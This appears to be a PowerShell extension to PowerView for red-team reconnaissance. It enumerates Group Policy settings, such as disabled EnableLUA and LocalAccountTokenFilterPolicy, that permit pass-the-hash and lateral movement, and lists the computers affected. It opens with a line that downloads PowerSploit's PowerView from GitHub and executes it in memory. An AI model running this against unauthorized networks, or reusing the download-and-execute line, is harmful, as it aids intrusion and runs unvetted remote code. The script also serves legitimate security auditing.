#requires -version 2

# PowerView extensions for enumerating remote access policies through group policy.
# William Knowles (@william_knows) and Jon Cave (@joncave)
# For more details, see: https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo

# The following PowerView extensions were based on the code from commit be932ce
# Obtain a copy of this ...
IEX (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/be932ce2be3e2a574c403f1635057029e176f858/Recon/PowerView.ps1")

function Find-ComputersWithRemoteAccessPolicies {
<#
.SYNOPSIS

Returns the DNS hostnames of computers with remote access policies relevant to lateral movement.
    
.DESCRIPTION

Checks GPO for settings which deal with remote access policies relevant to lateral movement
(e.g., "EnableLUA" and "LocalAccountTokenFilterPolicy").  The OUs to which these GPOs are applied 
are then identified, and then the computer objects from each are retrieved.  Note that this only 
retrieves computer objects who have had the relevent registry keys set through group policy.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

PS C:\> Find-ComputersWithRemoteAccessPolicies

Returns the DNS hostnames for computer objects that have GPOs applied which may enable lateral movement.

.EXAMPLE

PS C:\> Find-ComputersWithRemoteAccessPolicies -Domain dev.testlab.local

Returns the DNS hostnames for computer objects that have GPOs applied which may enable lateral movement. Limit to a particular domain.

.EXAMPLE

PS C:\> Find-ComputersWithRemoteAccessPolicies -SearchBase "OU=secret,DC=testlab,DC=local"

Returns the DNS hostnames for computer objects that have GPOs applied which may enable lateral movement. Limit to a particular organisational unit.
        
#>
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
        
    )
    
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $Domain }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase}
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope}
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        
    }

    PROCESS {
        
        $ComputerObjectsWithRemoteAccessPolicies = New-Object PSObject
        $ComputerObjectsWithRemoteAccessPolicies | Add-Member NoteProperty EnableLUA (New-Object System.Collections.Generic.List[System.Object])
        $ComputerObjectsWithRemoteAccessPolicies | Add-Member NoteProperty FilterAdministratorToken (New-Object System.Collections.Generic.List[System.Object])
        $ComputerObjectsWithRemoteAccessPolicies | Add-Member NoteProperty LocalAccountTokenFilterPolicy (New-Object System.Collections.Generic.List[System.Object])
        $ComputerObjectsWithRemoteAccessPolicies | Add-Member NoteProperty SeDenyNetworkLogonRight (New-Object System.Collections.Generic.List[System.Object])
        $ComputerObjectsWithRemoteAccessPolicies | Add-Member NoteProperty SeDenyRemoteInteractiveLogonRight (New-Object System.Collections.Generic.List[System.Object])
        
        $gpoSearchArguments = @{}
        $gpoSearchArguments = $gpoSearchArguments + $SearcherArguments
        $gpoSearchArguments.Remove("SearchBase")
        $gpoSearchArguments.Remove("SearchScope")
        # NOTE: SearchBase is removed here, as we do not wish it to be applied to the initial call to Get-DomainGPORemoteAccessPolicy
        # and instead for the search to be conducted across the domain
        $RemoteAccessPolicies = Get-DomainGPORemoteAccessPolicy @gpoSearchArguments
        
        $RemoteAccessPolicies.PSObject.Properties | ForEach-Object {
            $policy = $_.Name # EnableLUA, etc
            foreach ($guid in $RemoteAccessPolicies.$policy) {
                # set arguments for OU search (reading $SearchBase to limit the scope)
                $ouSearchArguments = @{}
                $ouSearchArguments = $ouSearchArguments + $SearcherArguments
                $ouSearchArguments['GPLink'] = $guid
                Get-DomainOU @ouSearchArguments | ForEach-Object {
                    $compSearchArguments = @{}
                    $compSearchArguments = $compSearchArguments + $SearcherArguments
                    $compSearchArguments['SearchBase'] = $_.distinguishedname
                    $OUComputers = Get-DomainComputer @compSearchArguments
                    $OUComputers | ForEach-Object {
                        if ($ComputerObjectsWithRemoteAccessPolicies.$policy -notcontains $_.dnshostname) { $ComputerObjectsWithRemoteAccessPolicies.$policy += $_.dnshostname }
                    }
                }
            }
        }
    }
    
    END {
        return $ComputerObjectsWithRemoteAccessPolicies
    }
}

function Get-DomainGPORemoteAccessPolicy {
<#
.SYNOPSIS

Enumerates GPOs that control settings that deal with remote access policies.
    
.DESCRIPTION

Checks GPO for five different remote access policies.  Three which relate to User 
Account Control (UAC) and two which relate to User Rights Assignment (URA).
The three UAC policies are: 
(1) "EnableLUA" which controls "Admin Approval Mode" for the local administrator group.
When set to 0 UAC is disabled. This setting can be controlled by group policy directly 
and is stored in "GptTmpl.inf".
(2) "FilterAdministratorToken" controls "Admin Approval Mode" for the RID 500 account.
When set to 0 remote connections for the RID 500 account will be granted a high 
integrity token.  This setting is disabled by default.  This setting can be controlled 
by group policy directly and is stored in "GptTmpl.inf".
(3) "LocalAccountTokenFilterPolicy" controls token integrity for remote connections.  
When set to 1 all remote connections for local users in the local administrator group 
will be granted a high integrity token.  This setting can only be set through a custom 
registry key and is stored in "Registry.xml".
The order of precedence for the above three UAC commands is: EnableLUA, 
LocalAccountTokenFilterPolicy, FilterAdministratorToken. For example, for 
FilterAdministratorToken to have an effect EnableLUA would need to be set to 1, and 
LocalAccountTokenFilterPolicy to 0.
The two URA policies are:
(4) and (5) "SeDenyNetworkLogonRight" and "SeDenyRemoteInteractiveLogonRight" are 
checked to see if they include the SID of the built-in Administrators group.  If they 
do, any member of this group can not be used to perform network or remote interactive 
authentication against the computer object on which they are configured.

.PARAMETER Identity

A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),
GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPORemoteAccessPolicy

Returns an object where the key is the remote access policy, and the value is
a list of GPOs which set the policy.

#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Domain']) { $ConvertArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }

        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }
        
        $RemoteAccessPolicies = New-Object PSObject
        $RemoteAccessPolicies | Add-Member NoteProperty EnableLUA (New-Object System.Collections.Generic.List[System.Object])
        $RemoteAccessPolicies | Add-Member NoteProperty FilterAdministratorToken (New-Object System.Collections.Generic.List[System.Object])
        $RemoteAccessPolicies | Add-Member NoteProperty LocalAccountTokenFilterPolicy (New-Object System.Collections.Generic.List[System.Object])
        $RemoteAccessPolicies | Add-Member NoteProperty SeDenyNetworkLogonRight (New-Object System.Collections.Generic.List[System.Object])
        $RemoteAccessPolicies | Add-Member NoteProperty SeDenyRemoteInteractiveLogonRight (New-Object System.Collections.Generic.List[System.Object])

        # get every GPO from the specified domain
        Get-DomainGPO @SearcherArguments | ForEach-Object {

            $GPOdisplayName = $_.displayname
            $GPOname = $_.name
            $GPOPath = $_.gpcfilesyspath
            
            # EnableLUA and FilterAdministratorToken check via GptTmpl.inf
            $ParseArgs =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }
            # parse the GptTmpl.inf file (if it exists) for this GPO
            $Inf = Get-GptTmpl @ParseArgs         
            if($Inf -and ($Inf.psbase.Keys -contains "Registry Values")) 
            {
                $EnableLUA = $Inf["Registry Values"]["MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA"]
                if ($EnableLUA -and ($EnableLUA[0] -eq 4) -and ($EnableLUA[1] -eq 0))
                {
                    Write-Verbose "The following GPO enables pass-the-hash by disabling EnableLUA: $GPOdisplayName - $GPOname"
                    # append to EnableLUA GPO list if it is not already there
                    if ($RemoteAccessPolicies.EnableLUA -notcontains $GPOname) { $RemoteAccessPolicies.EnableLUA += $GPOname }
                }
                
                $FilterAdministratorToken = $Inf["Registry Values"]["MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken"]
                if ($FilterAdministratorToken -and ($FilterAdministratorToken[0] -eq 4) -and ($FilterAdministratorToken[1] -eq 0))
                {
                    Write-Verbose "The following GPO exempts the RID 500 account from UAC protection by disabling FilterAdministratorToken: $GPOdisplayName - $GPOname"
                    # append to FilterAdministratorToken GPO list if it is not already there
                    if ($RemoteAccessPolicies.FilterAdministratorToken -notcontains $GPOname) { $RemoteAccessPolicies.FilterAdministratorToken += $GPOname }
                }
            }
            
            # LocalAccountTokenFilterPolicy check via Registry.xml
            # clear $ParseArgs for next use.
            $ParseArgs.Clear()
            # parse Registry.xml file (if it exists) for LocalAccountTokenFilterPolicy 
            $ParseArgs =  @{ 'RegistryXMLpath' = "$GPOPath\MACHINE\Preferences\Registry\Registry.xml" }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }
            Get-RegistryXML @ParseArgs | ForEach-Object {
                if ($_.property -eq "LocalAccountTokenFilterPolicy" -and ($_.value -eq "00000001")) 
                {
                    Write-Verbose "The following GPO enables pass-the-hash by enabling LocalAccountTokenFilterPolicy: $GPOdisplayName - $GPOname"
                    # append to EnableLUA GPO list if it is not already there
                    if ($RemoteAccessPolicies.LocalAccountTokenFilterPolicy -notcontains $GPOname) { $RemoteAccessPolicies.LocalAccountTokenFilterPolicy += $GPOname }
                }
            }   
            
            # SeDenyNetworkLogonRight and SeDenyRemoteInteractiveLogonRight check via GptTmpl.inf
            # Use existing object that parsed the file
            if($Inf -and ($Inf.psbase.Keys -contains "Privilege Rights")) 
            {
                $SeDenyNetworkLogonRight = $Inf["Privilege Rights"]["SeDenyNetworkLogonRight"]
                if ($SeDenyNetworkLogonRight -and ($SeDenyNetworkLogonRight -contains "*S-1-5-32-544"))
                {
                    Write-Verbose "The following GPO includes the built-in Administrators group within the SeDenyNetworkLogonRight: $GPOdisplayName - $GPOname"
                    # append to SeDenyNetworkLogonRight GPO list if it is not already there
                    if ($RemoteAccessPolicies.SeDenyNetworkLogonRight -notcontains $GPOname) { $RemoteAccessPolicies.SeDenyNetworkLogonRight += $GPOname }
                }
                
                $SeDenyRemoteInteractiveLogonRight = $Inf["Privilege Rights"]["SeDenyRemoteInteractiveLogonRight"]
                if ($SeDenyRemoteInteractiveLogonRight -and ($SeDenyRemoteInteractiveLogonRight -contains "*S-1-5-32-544"))
                {
                    Write-Verbose "The following GPO includes the built-in Administrators group within the SeDenyRemoteInteractiveLogonRight: $GPOdisplayName - $GPOname"
                    # append to SeDenyRemoteInteractiveLogonRight GPO list if it is not already there
                    if ($RemoteAccessPolicies.SeDenyRemoteInteractiveLogonRight -notcontains $GPOname) { $RemoteAccessPolicies.SeDenyRemoteInteractiveLogonRight += $GPOname }
                }
            }
        }
    }
    
    END {
        # return hash table containing lists of GPOs for each remote access policy
        return $RemoteAccessPolicies
    }
}

function Get-RegistryXML {
<#
.SYNOPSIS

Helper to parse a Registry.xml file path into an array of custom objects.

.PARAMETER RegistryXMLpath

The Registry.xml file path name to parse.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $RegistryXMLPath,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $MappedPaths = @{}
    }

    PROCESS {
        try {
        
            if (($RegistryXMLPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $SysVolPath = "\\$((New-Object System.Uri($RegistryXMLPath)).Host)\SYSVOL"
                if (-not $MappedPaths[$SysVolPath]) {
                    # map IPC$ to this computer if it's not already
                    Add-RemoteConnection -Path $SysVolPath -Credential $Credential
                    $MappedPaths[$SysVolPath] = $True
                }
            }
            
            [XML]$RegistryXMLcontent = Get-Content $RegistryXMLPath -ErrorAction Stop
        
            $registryKeyArray = New-Object System.Collections.Generic.List[System.Object]
        
            # process all registry properties in the XML
            $RegistryXMLcontent | Select-Xml "/RegistrySettings/Registry" | Select-Object -ExpandProperty node | ForEach-Object {
                           
            $GPORegistry = New-Object PSObject
            $GPORegistry | Add-Member Noteproperty "hive" $_.Properties.hive
            $GPORegistry | Add-Member Noteproperty "key" $_.Properties.key
            $GPORegistry | Add-Member Noteproperty "property" $_.Properties.name
            $GPORegistry | Add-Member Noteproperty "type" $_.Properties.type
            $GPORegistry | Add-Member Noteproperty "value" $_.Properties.value
            
            $registryKeyArray.Add($GPORegistry)
           
            }            
        }
        catch {
            Write-Verbose "[Get-RegistryXML] Error parsing $TargetRegistryXMLPath : $_"
        }
    }

    END {
        # remove the SYSVOL mappings
        $MappedPaths.Keys | ForEach-Object { Remove-RemoteConnection -Path $_ }
        # return array of regsitry settings
        return $registryKeyArray
    }
}
